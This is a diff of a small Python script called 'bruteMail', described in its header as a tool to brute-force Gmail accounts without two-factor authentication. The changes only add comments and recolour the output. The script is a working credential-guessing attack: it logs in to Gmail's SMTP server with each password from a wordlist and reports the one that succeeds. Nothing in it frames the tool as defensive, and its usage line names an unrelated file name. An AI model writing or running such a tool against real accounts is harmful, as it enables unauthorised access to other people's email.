@@ -1,7 +1,12 @@
 #!/usr/bin/python
 
+# bruteMail - Bruteforce Gmail account not using 2FA/MFA.
+# Author: Ethan Smith
+# Usage: python .\wifiPass2file.py
+# Python 3
+
 import smtplib
-from termcolor import colored
+from termcolor import cprint
 
 def brute_mail():
     email = input("Enter Gmail username: ")
@@ -11,17 +16,17 @@ def brute_mail():
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.ehlo()
     except:
-        print("Error: Verify Gmail SMTP settings.")
+        cprint("Error: Verify Gmail SMTP settings.", 'red')
         exit()
 
     for password in passwd_file:
         password = password.strip('\n')
         try:
             server.login(email, password)
-            print(colored("[+] Password found: %s" % password, 'green'))
+            cprint(f"[+] Password found: {password}", 'green')
             break
         except smtplib.SMTPAuthenticationError:
-            print(colored("[-] Error: Not a valid password.", 'red'))
+            cprint("[-] Error: Not a valid password.", 'red')
     server.quit()
 
 brute_mail()
